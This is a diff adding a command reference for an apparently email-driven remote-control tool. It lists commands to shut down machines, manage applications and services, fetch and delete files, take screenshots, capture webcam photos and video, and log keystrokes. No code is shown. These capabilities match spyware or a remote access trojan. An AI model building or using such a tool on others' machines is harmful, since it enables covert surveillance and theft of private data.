@@ -1,0 +1,88 @@
+List of available commands:
+
+1/ Shutdown:
+- Subject: shutdown
+- Body: IP (line 1)
+
+2/ Restart:
+- Subject: restart
+- Body: IP (line 1)
+
+3/ Application:
+a/ List Applications
+- Subject: listapp
+- Body: IP (line 1)
+- Return list of applications in .txt
+
+b/ Start Application:
+- Subject: startapp
+- Body: IP (line 1), Application name (line 2)
+
+c/ Stop Application:
+- Subject: stopapp
+- Body: IP (line 1), Application's PID (line 2)
+
+4/ Service:
+a/ List Services
+- Subject: listser
+- Body: IP (line 1)
+- Return list of services in .txt
+
+b/ Start Service:
+- Subject: startser
+- Body: IP (line 1), execution file/service name (line 2)
+
+c/ Stop Service:
+- Subject: stopser
+- Body: IP (line 1), execution file/service name (line 2)
+
+5/ File:
+a/ List File
+- Subject: listfile
+- Body: IP (line 1), directory path (line 2)
+- Return list of files in .txt
+
+b/ Get file
+- Subject: getfile
+- Body: IP (line 1), file path (line 2)
+- Return file as attachment
+
+c/ Delete File:
+- Subject: delfile
+- Body: IP (line 1), file path (line 2)
+
+6/ Screenshot
+- Subject: screenshot
+- Body: IP (line 1)
+- Return screenshot as attachment
+
+7/ Webcam
+a/ Take a photo
+- Subject: takephoto
+- Body: IP (line 1)
+- Return photo as attachment
+
+b/ Start recording video
+- Subject: startrecord
+- Body: IP (line 1)
+
+c/ Stop recording video
+- Subject: stoprecord
+- Body: IP (line 1)
+- Return video as attachment
+- Require startrecord to be called before, maximum video length: 120 seconds
+
+8/ Keylogger
+a/ Start recording keystroke
+- Subject: startkeylog
+- Body: IP (line 1)
+
+b/ Stop recording keystroke
+- Subject: stopkeylog
+- Body: IP (line 1)
+- Return keystroke as attachment
+- Require startkeylog to be called before, maximum time length: 300 seconds
+
+9/ Help:
+- Subject: help
+- Return list of available commands
